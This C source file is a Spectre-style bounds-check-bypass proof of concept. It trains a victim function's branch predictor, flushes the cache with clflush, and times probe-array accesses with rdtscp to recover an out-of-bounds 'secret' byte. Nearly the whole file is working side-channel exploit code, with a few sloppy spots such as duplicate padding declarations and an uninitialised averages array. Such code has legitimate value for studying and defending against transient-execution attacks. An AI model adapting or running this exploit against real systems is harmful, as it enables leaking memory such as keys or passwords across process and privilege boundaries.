#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <x86intrin.h> /* for rdtscp and clflush */

/********************************************************************
Victim code.
********************************************************************/
volatile unsigned int pd_bound = 11;
#define CACHE_SIZE 256
#define LEAK_SIZE 16
#define pa_size (LEAK_SIZE * CACHE_SIZE)
int TIMES = 1000;
uint8_t _padding[CACHE_SIZE * 4];
uint8_t *probe_array;
uint8_t _padding[CACHE_SIZE * 4];
int maxs[LEAK_SIZE];
int mins[LEAK_SIZE];
int order[LEAK_SIZE];
int *all_times;
int iteration = 0;

uint8_t _padding[CACHE_SIZE * 4];
char common_data[12] = "hello world";
char secret_data = 7;
uint8_t _padding[CACHE_SIZE * 4];

volatile uint8_t temp;

int victim_function(size_t x) {
  /* return pd->common_data[x]; */
  if (x < pd_bound) {
    return common_data[x];
  } else {
    return -1;
  }
}

/********************************************************************
Analysis code
********************************************************************/

#define CACHE_HIT_THRESHOLD 100 /* assume cache hit if time <= threshold */

void train() {
  for (int i = 0; i < 1000; ++i) {
    victim_function(i%11);
  }
  _mm_clflush((void*)&pd_bound);
}

void flush() {
  for (int i = 0; i < pa_size; i += 64) {
    _mm_clflush(probe_array+i);
  }
}

size_t scan() {
  uint64_t time1, time2;
  uint64_t min_time = 10000000, max_time = 0;
  int min_i, max_i;
  volatile uint8_t *addr;
  int junk;

  for (int i = 0; i < LEAK_SIZE; i++) {
    int mix_i = order[i];
    time1 = __rdtscp(&junk);
    time1 = __rdtscp(&junk);

    addr = probe_array + (mix_i * CACHE_SIZE);
    junk = *addr; // MEMORY ACCESS TO TIME

    time2 = __rdtscp(&junk) - time1; // READ TIMER & COMPUTE ELAPSED TIME
    time2 = __rdtscp(&junk) - time1; // READ TIMER & COMPUTE ELAPSED TIME
    /* printf("time %2d = %ld\n", mix_i, time2); */
    if (time2 <= min_time) {
      min_time = time2;
      min_i = mix_i;
    }
    if (time2 >= max_time) {
      max_time = time2;
      max_i = mix_i;
    }
    all_times[mix_i + (iteration * LEAK_SIZE)] = time2;
  }

  mins[min_i] += 1;
  maxs[max_i] += 1;
}

void shuffle_order()
{
        size_t i;
        for (i = 0; i < LEAK_SIZE - 1; i++)
        {
          size_t j = i + rand() / (RAND_MAX / (LEAK_SIZE - i) + 1);
          int t = order[j];
          order[j] = order[i];
          order[i] = t;
        }
}

int main(int argc, const char **argv) {

  if (argc == 2) { TIMES = atoi(argv[1]); }

  for (int i = 0; i < LEAK_SIZE; ++i) order[i] = i;
  malloc(sizeof(int) * 64);
  malloc(sizeof(int) * 64);
  malloc(sizeof(int) * 64);
  all_times = malloc(sizeof(int) * LEAK_SIZE * TIMES);
  for (int i = 0; i < 16; ++i) {
    mins[i] = 0;
    maxs[i] = 0;
  }

  volatile int junk;
  int secret;

  printf("common_data = 0x%lx\n", common_data);
  printf("secret_data = 0x%lx\n", &secret_data);
  printf("Secret value = %d\n", secret_data);
  printf("Secret value = %d\n", common_data[12]);

  for (int i = 0; i < TIMES; ++i) {

    shuffle_order();
    probe_array = malloc(pa_size);
    printf("probe_array = 0x%lx\n", probe_array);
    train();
    flush();

    for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
    secret = victim_function(12);
    junk = probe_array[secret * CACHE_SIZE];

    for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
    scan();

    iteration += 1;
    free(probe_array);
    malloc(sizeof(int) * 64);
  }

  printf("Junk = %d\n", junk);

  int *avg_times = malloc(sizeof(int) * LEAK_SIZE);
  for (int i = 0; i < LEAK_SIZE; ++i) {
    for (int j = 0; j < iteration; ++j) {
      avg_times[i] += all_times[i+(j*LEAK_SIZE)];
      /* printf("all_times[%d (%d + (%d * 16))] =
        %d\n", (i+(j*16)), i, j, all_times[i+(j*16)]); */
    }
    avg_times[i] = avg_times[i] / iteration;
    /* avg_times[i] = all_times[i + (iteration * 8)]; */
  }

  for (int i = 0; i < LEAK_SIZE; ++i) {
    printf("avg[%d] = %d\n", i, avg_times[i]);
  }

  int min_i, max_i;
  int min = 0, max = 0;
  for (int i = 0; i < LEAK_SIZE; ++i) {
    if (mins[i] >= min) {
      min = mins[i];
      min_i = i;
    }
    if (maxs[i] >= max) {
      max = maxs[i];
      max_i = i;
    }
  }
  printf("min / max: %ld / %ld\n", min_i, max_i);
  const int MINN = TIMES;
  for (int i = 0; i < LEAK_SIZE; ++i) {
    printf("%2d: %5d - ", i, mins[i]);
    for (int g = 0; g < 80.0 * mins[i] / MINN; ++g) {
      printf("#");
    }
    printf("\n");
  }

  return 0;
}
